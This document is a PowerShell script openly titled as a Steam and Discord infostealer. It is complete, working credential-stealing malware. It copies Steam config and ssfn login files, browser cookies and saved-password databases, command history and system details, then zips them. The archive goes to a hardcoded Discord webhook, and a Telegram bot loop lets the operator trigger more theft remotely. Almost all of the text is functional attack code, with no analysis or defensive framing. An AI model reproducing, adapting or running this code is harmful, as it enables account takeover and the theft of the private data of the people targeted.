# Steam & Discord Infostealer v2.0
# Set parameters
$discordWebhook = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
$telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
$telegramChatID = "YOUR_TELEGRAM_CHAT_ID"
$tempDir = "$env:TEMP\SteamLogs"
$zipPath = "$env:TEMP\SteamData_$((Get-Date).ToString('yyyyMMdd_HHmmss')).zip"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 1. Function to capture PowerShell command history
function Get-CommandHistory {
    Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File "$tempDir\PowerShell_History.txt"
}

# 2. Function to steal Steam files & configs
function Get-SteamData {
    $steamPaths = @("$env:ProgramFiles(x86)\Steam", "${env:ProgramFiles}\Steam", "$env:USERPROFILE\AppData\Local\Steam")
    foreach ($path in $steamPaths) {
        if (Test-Path $path) {
            Copy-Item "$path\config\*.vdf" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
            Copy-Item "$path\ssfn*" $tempDir -Force -ErrorAction SilentlyContinue
            Copy-Item "$path\userdata\*\config\localconfig.vdf" $tempDir -Force -ErrorAction SilentlyContinue
        }
    }
}

# 3. Function to steal cookies & passwords from browsers (Chrome, Edge, Firefox)
function Get-BrowserData {
    $browsers = @("Chrome", "MicrosoftEdge", "Firefox")
    foreach ($browser in $browsers) {
        try {
            $dataPath = "$env:USERPROFILE\AppData\Local\$browser\User Data\Default"
            if (Test-Path $dataPath) {
                Copy-Item "$dataPath\Cookies" "$tempDir\${browser}_Cookies" -Force -ErrorAction SilentlyContinue
                Copy-Item "$dataPath\Login Data" "$tempDir\${browser}_LoginData" -Force -ErrorAction SilentlyContinue
            }
        } catch {}
    }
}

# 4. Function to collect system info & Steam tokens
function Get-SystemInfo {
    systeminfo | Out-File "$tempDir\SystemInfo.txt"
    (Get-WmiObject -Class Win32_ComputerSystem).Model | Out-File "$tempDir\PC_Model.txt"
    $steamProcess = Get-Process steam -ErrorAction SilentlyContinue
    if ($steamProcess) {
        $steamProcess | Select-Object Id, StartTime, Path | Out-File "$tempDir\Steam_Process.txt"
    }
}

# 5. Create a ZIP archive of all stolen data
function Compress-Data {
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
}

# 6. Function to send data via Discord webhook
function Send-DiscordWebhook {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $zipPath -Leaf)`"",
        "Content-Type: application/zip`r`n",
        $fileEnc,
        "--$boundary--"
    ) -join "`r`n"
    Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
}

# 7. Telegram bot control - Check for commands
function Check-TelegramCommand {
    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/getUpdates" -Method Get
    $lastMessage = $updates.result[-1].message.text
    if ($lastMessage -eq "/startsteal") {
        Execute-Stealer
        Send-DiscordWebhook
        Send-TelegramMessage "Stealer executed. Data sent to Discord."
    }
}

# 8. Send message via Telegram
function Send-TelegramMessage {
    param($message)
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=$message" -Method Get
}

# Main execution
function Execute-Stealer {
    Get-CommandHistory
    Get-SteamData
    Get-BrowserData
    Get-SystemInfo
    Compress-Data
}

# Run once and wait for Telegram commands in a loop
Execute-Stealer
Send-DiscordWebhook
while ($true) {
    Check-TelegramCommand
    Start-Sleep -Seconds 60
}
